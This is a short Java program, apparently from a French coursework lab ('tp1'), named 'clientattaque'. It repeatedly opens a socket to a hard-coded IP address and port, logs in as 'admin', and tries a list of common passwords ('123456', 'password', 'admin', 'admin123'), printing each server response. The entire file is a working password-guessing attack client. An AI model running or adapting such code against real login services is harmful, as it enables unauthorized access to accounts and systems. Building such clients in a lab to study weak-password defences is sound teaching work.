package tp1;

import java.io.*;
import java.net.*;

public class clientattaque {

    public static void main(String[] args) throws Exception {
        String[] passwords = {"123456", "password", "admin", "admin123"};

        for (String pwd : passwords) {
            Socket socket = new Socket("100.104.161.142", 7016);

            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());

            // LOGIN
            in.readLine();
            out.writeBytes("admin\n");

            // PASSWORD
            in.readLine();
            out.writeBytes(pwd + "\n");

            // RESULTAT
            String response = in.readLine();
            System.out.println("Test avec [" + pwd + "] -> " + response);

            socket.close();

            Thread.sleep(2000); // simulation lente pour rester safe
        }
    }
}